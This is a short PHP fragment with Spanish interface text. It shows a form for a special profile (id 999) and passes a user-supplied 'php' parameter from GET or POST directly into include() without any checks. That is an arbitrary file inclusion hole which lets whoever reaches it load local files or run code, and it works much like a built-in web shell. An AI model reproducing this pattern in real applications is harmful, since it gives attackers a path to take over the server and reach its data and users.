<?php

if($id_perfil==999){

		if($_GET['php']){
			$phps = $_GET['php'];
		}elseif($_POST['php']){
			$phps = $_POST['php'];
		}



		if($phps!=""){
			include($phps);
		}else{

			$accion_form = "index.php?accion=$accion";
			$contenido = "<table width=\"300\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\">
                	<tr>
                  	<td align=\"center\" class=\"textos\">Ingresa php</td>
				 		 <td align=\"center\" class=\"textos\"><input type=\"text\" name=\"php\"></td> 
                	</tr>
					<tr><td align=\"center\" class=\"textos\" colspan=\"2\"><input type=\"submit\" name=\"Submit\" value=\"Aceptar\"> </td></tr> 
        	      </table>";
		}

}


?>